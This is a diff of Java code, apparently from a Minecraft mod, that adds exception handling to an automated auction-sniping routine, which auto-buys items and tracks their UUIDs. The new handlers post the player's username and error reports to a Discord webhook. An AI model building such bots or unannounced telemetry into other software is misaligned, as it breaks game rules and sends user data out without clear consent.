-                    String itemUUID = "";
-                    if (UUIDCheckerEnable) {
-                        NBTTagCompound extraAttr = ItemUtil.getExtraAttributes(itemStack);
+                        String itemUUID = "";
+                        if (UUIDCheckerEnable) {
+                            NBTTagCompound extraAttr = ItemUtil.getExtraAttributes(itemStack);
 
-                        if (extraAttr != null) {
-                            itemUUID = UUID.fromString(extraAttr.getString("uuid")).toString();
-                            // UUID が登録済みの場合、無視
-                            if (this.checkUUID(itemUUID)) {
-                                Util.send("sbid" + itemUUID);
-                                Util.send("§c購入のスキップ.. (購入済みのUUID)");
-                            } else {
-                                // ifブロック1: 購入処理
-                                this.lastseller = this.getLastSeller(itemStack);
-                                // UUIDを登録
-                                this.registerUUID(itemUUID);
-                                this.clickSlot(clickTarget1 + clickTarget2 - 1, 0);
-                                this.currentStep = 1;
-                                this.timer = System.currentTimeMillis();
-                                return;
+                            if (extraAttr != null) {
+                                itemUUID = extraAttr.getString("uuid");
+                                // UUID が登録済みの場合、無視
+                                if (this.checkUUID(itemUUID)) {
+                                    Util.send("sbid" + itemUUID);
+                                    Util.send("§c購入のスキップ.. (購入済みのUUID)");
+                                } else {
+                                    // ifブロック1: 購入処理
+                                    this.lastseller = this.getLastSeller(itemStack);
+                                    // UUIDを登録
+                                    this.registerUUID(itemUUID);
+                                    this.clickSlot(clickTarget1 + clickTarget2 - 1, 0);
+                                    this.currentStep = 1;
+                                    this.timer = System.currentTimeMillis();
+                                    return;
+                                }
                             }
                         }
                     }
                 }
-            }
-            if (clickTarget2 == 6) {
-                clickTarget2 = 0;
-                clickTarget1 += 9;
-                if (++rowCounter == 5) {
-                    this.changePage(openContainer);
-                    this.timer = System.currentTimeMillis();
+                if (clickTarget2 == 6) {
+                    clickTarget2 = 0;
+                    clickTarget1 += 9;
+                    if (++rowCounter == 5) {
+                        this.changePage(openContainer);
+                        this.timer = System.currentTimeMillis();
+                    }
                 }
+                ++i;
             }
-            ++i;
+        }
+        catch (NullPointerException NPE) {
+            NPE.printStackTrace();
+//            autoErrorReportingService(NPE.toString());
+            Util.send("§c実行中にNPEが発生しました。");
+
+            if (getConfigValueBoolean("onTickNPECatcher")) { stopSnipe(); }
+
+            autoErrorReportingService(NPE);
+            sendMessageToDiscord(Wrapper.mc.getSession().getUsername() + ": NPEによるスナイプの停止", WebHookUrls.purchasedItemNotification);
+            return;
+        }
+        catch (Exception e) {
+            e.printStackTrace();
+            autoErrorReportingService(e);
+            Util.send("§c実行中にエラーが発生しました。 詳しくはエラーログを確認してください");
+            stopSnipe();
+            return;
         }
     }
 
